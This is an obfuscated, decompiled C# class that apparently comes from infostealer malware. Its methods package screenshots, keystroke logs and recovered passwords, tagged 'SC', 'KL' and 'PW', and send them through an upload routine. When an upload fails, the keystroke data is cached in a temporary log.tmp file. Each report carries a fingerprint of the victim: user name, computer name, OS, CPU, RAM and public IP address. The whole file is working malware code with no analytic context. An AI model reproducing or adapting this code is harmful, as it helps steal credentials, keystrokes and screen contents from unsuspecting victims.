using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using RwUya;
using ZAZUx;
using p3N5Y;
using q9Ep;

namespace ppkr;

public class HaT
{
	public static void _9RWNrGS(MemoryStream SxAiTnTj)
	{
		int num = 0;
		List<aCYVob> list = default;
		List<aCYVob> elqnYMZ = default;
		do
		{
			if (num == 2)
			{
				list.Add(new aCYVob
				{
					MimeType = "image/jpg",
					Filename = WbPSHtt9() + "_" + DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss") + ".jpeg",
					Extension = "jpg",
					FileBytes = SxAiTnTj.ToArray()
				});
				num = 3;
			}
			if (num == 3)
			{
				elqnYMZ = list;
				num = 4;
			}
			if (num == 4)
			{
				_2M9sod5dN.rY5NTIcDkxo(Pw67lwxhh("SC"), WbPSHtt9(), elqnYMZ, 1);
				num = 5;
			}
			if (num == 1)
			{
				list = new List<aCYVob>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
	}

	public static void Ad9ZQiXJ(string tUFkFIurdTV)
	{
		int num = 0;
		string path = default;
		do
		{
			if (num == 1)
			{
				path = Path.GetTempPath() + "/log.tmp";
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			if (File.Exists(path))
			{
				_2M9sod5dN.rY5NTIcDkxo(Pw67lwxhh("KL"), WbPSHtt9() + File.ReadAllText(path));
				File.Delete(path);
			}
			_2M9sod5dN.rY5NTIcDkxo(Pw67lwxhh("KL"), WbPSHtt9() + tUFkFIurdTV);
		}
		catch
		{
			File.AppendAllText(path, "<br>[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "]<br>" + tUFkFIurdTV + "<br>");
		}
	}

	public static void uqDcovklWyu()
	{
		int num = 0;
		List<ii68> list = default;
		List<ii68>.Enumerator enumerator = default;
		StringBuilder stringBuilder = default;
		while (true)
		{
			if (num == 2)
			{
				if (list.Count <= 0)
				{
					break;
				}
				num = 3;
			}
			if (num == 1)
			{
				list = m6wnhTldkcK.VmMr7DANL();
				num = 2;
			}
			if (num == 4)
			{
				enumerator = list.GetEnumerator();
				num = 5;
			}
			if (num == 3)
			{
				stringBuilder = new StringBuilder();
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 5)
			{
				continue;
			}
			try
			{
				while (enumerator.MoveNext())
				{
					ii68 current = enumerator.Current;
					stringBuilder.Append(current.YK49f1j3());
				}
			}
			finally
			{
				((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
			}
			if (stringBuilder.ToString().Length > 0)
			{
				_2M9sod5dN.rY5NTIcDkxo(Pw67lwxhh("PW"), WbPSHtt9() + stringBuilder.ToString());
			}
			stringBuilder.Clear();
			list.Clear();
			break;
		}
	}

	private static string WbPSHtt9()
	{
		int num = 0;
		string[] array = default;
		string text = default;
		do
		{
			if (num == 7)
			{
				array[5] = SystemInformation.ComputerName;
				num = 8;
			}
			if (num == 16)
			{
				if (!dBDNalx6.PublicIpAddressGrab)
				{
					break;
				}
				num = 17;
			}
			if (num == 13)
			{
				array[11] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.AmountOfMemory);
				num = 14;
			}
			if (num == 8)
			{
				array[6] = "<br>OSFullName: ";
				num = 9;
			}
			if (num == 12)
			{
				array[10] = "<br>RAM: ";
				num = 13;
			}
			if (num == 10)
			{
				array[8] = "<br>CPU: ";
				num = 11;
			}
			if (num == 3)
			{
				array[1] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");
				num = 4;
			}
			if (num == 2)
			{
				array[0] = "Time: ";
				num = 3;
			}
			if (num == 6)
			{
				array[4] = "<br>Computer Name: ";
				num = 7;
			}
			if (num == 1)
			{
				array = new string[13];
				num = 2;
			}
			if (num == 9)
			{
				array[7] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.OperatingSystemName);
				num = 10;
			}
			if (num == 17)
			{
				text = text + "IP Address: " + dBDNalx6.PublicIpAddress + "<br>";
				num = 18;
			}
			if (num == 11)
			{
				array[9] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.ProcessorName);
				num = 12;
			}
			if (num == 5)
			{
				array[3] = SystemInformation.UserName;
				num = 6;
			}
			if (num == 15)
			{
				text = string.Concat(array);
				num = 16;
			}
			if (num == 14)
			{
				array[12] = "<br>";
				num = 15;
			}
			if (num == 4)
			{
				array[2] = "<br>User Name: ";
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 18);
		return text + "<hr>";
	}

	private static string xW7(string sr1ylJAO = "")
	{
		int num = 0;
		string[] array = default;
		string text = default;
		do
		{
			if (num == 9)
			{
				array[7] = SystemInformation.ComputerName;
				num = 10;
			}
			if (num == 12)
			{
				array[10] = "\nCPU: ";
				num = 13;
			}
			if (num == 17)
			{
				text = string.Concat(array);
				num = 18;
			}
			if (num == 8)
			{
				array[6] = "/";
				num = 9;
			}
			if (num == 2)
			{
				array[0] = "New ";
				num = 3;
			}
			if (num == 1)
			{
				array = new string[15];
				num = 2;
			}
			if (num == 6)
			{
				array[4] = "\nUser Name: ";
				num = 7;
			}
			if (num == 14)
			{
				array[12] = "\nRAM: ";
				num = 15;
			}
			if (num == 5)
			{
				array[3] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");
				num = 6;
			}
			if (num == 7)
			{
				array[5] = SystemInformation.UserName;
				num = 8;
			}
			if (num == 4)
			{
				array[2] = " Recovered!\n\nTime: ";
				num = 5;
			}
			if (num == 13)
			{
				array[11] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.ProcessorName);
				num = 14;
			}
			if (num == 18)
			{
				if (!dBDNalx6.PublicIpAddressGrab)
				{
					break;
				}
				num = 19;
			}
			if (num == 15)
			{
				array[13] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.AmountOfMemory);
				num = 16;
			}
			if (num == 10)
			{
				array[8] = "\nOSFullName: ";
				num = 11;
			}
			if (num == 3)
			{
				array[1] = sr1ylJAO;
				num = 4;
			}
			if (num == 16)
			{
				array[14] = "\n";
				num = 17;
			}
			if (num == 19)
			{
				text = text + "IP Address: " + dBDNalx6.PublicIpAddress + "\n";
				num = 20;
			}
			if (num == 11)
			{
				array[9] = _0AdmNePQzz.RUJ(_0AdmNePQzz.MEz.OperatingSystemName);
				num = 12;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 20);
		return text;
	}

	private static string Pw67lwxhh(string jcNo3bkukW0 = "")
	{
		int num = 0;
		string[] array = default;
		do
		{
			if (num == 2)
			{
				array[0] = jcNo3bkukW0;
				num = 3;
			}
			if (num == 5)
			{
				array[3] = "/";
				num = 6;
			}
			if (num == 6)
			{
				array[4] = SystemInformation.ComputerName;
				num = 7;
			}
			if (num == 4)
			{
				array[2] = SystemInformation.UserName;
				num = 5;
			}
			if (num == 1)
			{
				array = new string[5];
				num = 2;
			}
			if (num == 3)
			{
				array[1] = "_";
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 7);
		return string.Concat(array);
	}
}
